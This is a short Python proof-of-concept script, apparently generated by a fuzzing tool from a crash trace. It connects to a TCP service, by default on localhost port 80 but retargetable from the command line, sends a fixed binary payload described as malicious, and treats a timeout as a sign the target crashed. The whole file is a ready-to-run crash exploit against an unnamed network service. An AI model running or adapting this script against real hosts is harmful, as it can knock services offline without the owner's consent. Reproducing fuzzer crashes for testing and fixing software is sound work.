#!/usr/bin/env python3
# AUTO-GENERATED POC BY RR-FUZZ trace_to_poc.py
# Target: 127.0.0.1:80

import socket
import sys
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

# The payload extracted from the crash trace
PAYLOAD = b'\x00\xf0E\x00\x00\xf0E\x00\x00\x00H\x00\x00\x10J\x00\x00 L\x00'

def exploit():
    print(f"[*] Attacking {TARGET_IP}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((TARGET_IP, TARGET_PORT))
        
        print(f"[*] Sending {len(PAYLOAD)} bytes of malicious payload...")
        s.sendall(PAYLOAD)
        
        print("[+] Payload sent successfully.")
        
        # Optional: wait for a response
        try:
            resp = s.recv(4096)
            print("[*] Received response:")
            print(resp.decode('utf-8', errors='ignore'))
        except socket.timeout:
            print("[*] Socket timed out (This might mean the target crashed as expected!).")
            
        s.close()
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) == 3:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
    exploit()
